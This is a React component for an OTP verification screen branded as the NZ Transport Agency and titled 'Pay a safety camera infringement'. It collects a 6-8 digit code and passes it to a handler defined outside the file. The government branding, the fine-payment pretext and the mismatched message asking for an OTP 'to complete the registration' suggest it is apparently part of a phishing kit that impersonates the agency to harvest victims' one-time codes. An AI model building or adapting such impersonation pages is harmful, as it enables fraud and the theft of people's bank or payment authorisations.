import React from 'react';
import { useLanguage } from '../hooks/useLanguage';
import './LoginScreen.css';
import nztaLogo from '../assets/nzta-logo.png';

function OtpVerificationForm({ otpCode, otpError, isLoading, onOtpChange, onSubmit, onBack }) {
  const { t } = useLanguage();

  // Safe translations with fallbacks
  const safeT = {
    otpMessage: 'Please enter the OTP code to complete the registration.',
    otpCode: 'OTP Code',
    otpPlaceholder: '000000',
    confirmCode: 'Confirm code',
    verifying: 'Verifying...',
    ...t,
  };

  return (
    <div className="nzta-renewal">
      {/* ─── Header ─── */}
      <header className="nzta-header">
        <div className="nzta-header-inner">
          <div className="nzta-logo">
            <img
              src={nztaLogo}
              alt="NZ Transport Agency"
              className="nzta-logo-img"
            />
          </div>
          
        </div>
      </header>

      {/* ─── Main ─── */}
      <main className="nzta-main">
        <a
          href="#back"
          className="nzta-back"
          onClick={(e) => {
            e.preventDefault();
            onBack?.();
          }}
        >
          ← Back
        </a>

        <h1 className="nzta-title"> Pay a safety camera infringement
</h1>

        
        <hr className="nzta-divider" />

        <p className="nzta-hint">
          All fields are required unless marked 'optional'.
        </p>

        <h2 className="nzta-subtitle">Verify OTP code</h2>

        <p className="nzta-help" style={{ marginBottom: 20 }}>
          {safeT.otpMessage}
        </p>

        <form onSubmit={onSubmit}>
          <div className="nzta-field">
            <label htmlFor="otpCode">{safeT.otpCode}</label>
            <input
              type="text"
              id="otpCode"
              value={otpCode}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 8);
                onOtpChange(value);
              }}
              placeholder={safeT.otpPlaceholder}
              maxLength="8"
              className={`nzta-input ${otpError ? 'input-error-red' : ''}`}
              autoFocus
            />
            {otpError && <span className="nzta-error-msg">{otpError}</span>}
          </div>

          <div className="nzta-actions">
            <button
              type="submit"
              className="nzta-btn nzta-btn-continue"
              disabled={isLoading}
            >
              {isLoading ? safeT.verifying : safeT.confirmCode}
            </button>
            <button
              type="button"
              className="nzta-btn nzta-btn-cancel"
              onClick={onBack}
              disabled={isLoading}
            >
              Cancel
            </button>
          </div>
        </form>
      </main>
    </div>
  );
}

export default OtpVerificationForm;